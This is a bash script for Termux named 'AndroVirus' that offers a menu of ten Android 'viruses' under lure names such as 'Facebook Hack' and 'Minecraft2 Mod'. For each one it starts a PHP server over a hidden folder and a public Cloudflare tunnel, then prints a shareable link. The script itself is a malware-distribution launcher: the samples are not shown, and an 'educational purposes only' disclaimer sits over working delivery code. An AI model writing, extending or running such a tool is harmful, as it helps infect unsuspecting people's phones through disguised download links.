#!/data/data/com.termux/files/usr/bin/bash
# Tool name : AndroVirus
# Author    : Alienkrishn [Anon4You]
# Copyright : ©Alienkrishn

RED=$'\e[31;1m'
GREEN=$'\e[32;1m'
YELLOW=$'\e[33;1m'
BLUE=$'\e[34;1m'
MAGENTA=$'\e[35;1m'
CYAN=$'\e[36;1m'
WHITE=$'\e[37;1m'
RESET=$'\e[0m'
BOLD=$'\e[1m'
UNDERLINE=$'\e[4m'

WEBDIR=".fxv"

cleanup() {
    echo -e "\n${RED}✗ Cleaning up...${RESET}"
    killall -9 php cloudflared > /dev/null 2>&1
    [ -f .cflog ] && rm .cflog > /dev/null 2>&1
    echo -e "${GREEN}✓ Done!${RESET}\n"
    exit 0
}

trap cleanup INT

prompt_input() {
    echo -n "" > /dev/tty
    read -p "Enter your choice > " choice
    choice=$(echo "$choice" | tr -d '\n\r' | xargs)
    echo "$choice"
}

show_banner() {
    clear
    echo -e "\a\a${RED}
                       ______
                    .-'      '-.
                   /            \\
       _          |              |          _
      ( \\         |,  .-.  .-.  ,|         / )
       > '=._     | )(__/  \\__)( |     _.=' <
      (_/'=._'=._ |/     /\\     \\| _.='_.='\\_)
             '=._ (_     ^^     _)'_.='
                 '=\\__|IIIIII|__/='
                _.='| \\IIIIII/ |'=._
      _     _.='_.='\\          /'=._'=._     _
     ( \\_.='_.='     \`--------\`     '=._'=._/ )
      > _.='                            '=._ <
     (_/                                    \\_)
${WHITE}            ▞▀▖     ▌      ▌ ▌▗
            ▙▄▌▛▀▖▞▀▌▙▀▖▞▀▖▚▗▘▄ ▙▀▖▌ ▌▞▀▘
            ▌ ▌▌ ▌▌ ▌▌  ▌ ▌▝▞ ▐ ▌  ▌ ▌▝▀▖
            ▘ ▘▘ ▘▝▀▘▘  ▝▀  ▘ ▀▘▘  ▝▀▘▀▀ ${UNDERLINE}version 3.0${RESET}
" 
    echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"  
    echo -e "${UNDERLINE}${RED}⚠ WARNING:${RESET} ${UNDERLINE}Educational purposes only!${RESET}"
    echo -e "${UNDERLINE}Do not install these on your device${RESET}"
    echo -e "${UNDERLINE}No responsibility for any damage caused${RESET}\n"
}

show_menu() {
    echo -e "${CYAN}${BOLD}➤ MAIN MENU:${RESET}"
    echo -e "${GREEN} 1 ${BOLD}➤ Virus Collection${RESET}"
    echo -e "${GREEN} 2 ${BOLD}➤ About This Script${RESET}"
    echo -e "${GREEN} 3 ${BOLD}➤ Developer Info${RESET}"
    echo -e "${RED} 0 ${BOLD}➤ Exit${RESET}"
}

show_virus_menu() {
    echo -e "${CYAN}${BOLD}➤ VIRUS COLLECTION:${RESET}"
    echo -e "
 ${GREEN}01 ${BOLD}➤ ${YELLOW}Agent${RESET}
 ${GREEN}02 ${BOLD}➤ ${YELLOW}AndroidFramework${RESET}
 ${GREEN}03 ${BOLD}➤ ${YELLOW}ArtStation${RESET}
 ${GREEN}04 ${BOLD}➤ ${YELLOW}BadNews${RESET}
 ${GREEN}05 ${BOLD}➤ ${YELLOW}BrainTest${RESET}
 ${GREEN}06 ${BOLD}➤ ${YELLOW}Facebook Hack${RESET}
 ${GREEN}07 ${BOLD}➤ ${YELLOW}IWinOnline${RESET}
 ${GREEN}08 ${BOLD}➤ ${YELLOW}Minecraft2 Mod${RESET}
 ${GREEN}09 ${BOLD}➤ ${YELLOW}MusicPlayer${RESET}
 ${GREEN}10 ${BOLD}➤ ${YELLOW}Settings${RESET}
 ${RED}00 ${BOLD}➤ ${YELLOW}Back to Main${RESET}
"
}
start_web_server() {
    local web_path="./$WEBDIR/v$1"
    local virus_name=$2
    
    echo -e "\n${MAGENTA}${BOLD}Starting $virus_name...${RESET}"
    echo -e "${BLUE}Note: ${YELLOW}If links don't appear, try runnig the tool again${RESET}\n"
    
    echo -e "${CYAN}[1/2] ${YELLOW}Starting PHP server...${RESET}"
    php -S localhost:8080 -t "$web_path" > /dev/null 2>&1 &
    sleep 3
    
    echo -e "${CYAN}[2/2] ${YELLOW}Starting Cloudflared tunnel...${RESET}"
    cloudflared tunnel -url localhost:8080 --logfile .cflog > /dev/null 2>&1 &
    sleep 10
    
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cflog")
    
    echo -e "\n${GREEN}${BOLD}Access Links:${RESET}"
    echo -e "${WHITE}Cloudflared: ${UNDERLINE}${BLUE}$link${RESET}"
    echo -e "${WHITE}LocalHost:   ${UNDERLINE}${BLUE}http://localhost:8080${RESET}"
    echo -e "\n${RED}Press ${BOLD}CTRL+C${RESET}${RED} to stop servers${RESET}"
    
    while true; do sleep 1; done
}

about_script() {
    echo -e "${CYAN}${BOLD}About AndroVirus:${RESET}"
    echo -e "
 ${BLUE}Tool name: ${WHITE}Androvirus${RESET}
 ${BLUE}Version:   ${WHITE}3.0${RESET}
 ${BLUE}Developer: ${WHITE}Alienkrishn${RESET}
 ${BLUE}Language:  ${WHITE}BASH${RESET}

${YELLOW}This script contains a collection of 10 simulated viruses
for educational and research purposes only. Some may be
detected by antivirus software. 

The script uses PHP to host HTML templates on localhost
and Cloudflared for port forwarding. Keep your hotspot
on when using this tool, though some devices may not
require it.${RESET}
"
    read -p "$(echo -e ${WHITE}Press enter to continue...${RESET})" -r
}

main() {
    while true; do
        show_banner
        show_menu
        sleep 0.5
        choice=$(prompt_input)
        echo -e "${YELLOW}DEBUG: You entered: '$choice'${RESET}"
        
        case "$choice" in
            1)
                while true; do
                    show_banner
                    show_virus_menu
                    sleep 0.5
                    virus_choice=$(prompt_input)
                    echo -e "${YELLOW}DEBUG: Virus menu choice: '$virus_choice'${RESET}"
                    
                    case "$virus_choice" in
                        01|1) start_web_server "1" "Agent" ;;
                        02|2) start_web_server "2" "AndroidFramework" ;;
                        03|3) start_web_server "3" "ArtStation" ;;
                        04|4) start_web_server "4" "BadNews" ;;
                        05|5) start_web_server "5" "BrainTest" ;;
                        06|6) start_web_server "6" "Facebook Hack" ;;
                        07|7) start_web_server "7" "IWinOnline" ;;
                        08|8) start_web_server "8" "Minecraft2 Mod" ;;
                        09|9) start_web_server "9" "MusicPlayer" ;;
                        10) start_web_server "0" "Settings" ;;
                        00|0) break ;;
                        *) echo -e "${RED}✗ Invalid choice in virus menu!${RESET}"; sleep 1 ;;
                    esac
                done
                ;;
            2) about_script ;;
            3) 
                echo -e "${CYAN}Opening GitHub profile...${RESET}"
                xdg-open "https://github.com/Anon4You" 
                sleep 2
                ;;
            0) 
                echo -e "${GREEN}✓ Exiting... Thank you!${RESET}"
                sleep 1
                exit 0
                ;;
            *) 
                echo -e "${RED}✗ Invalid choice in main menu!${RESET}"
                sleep 1
                ;;
        esac
    done
}
main
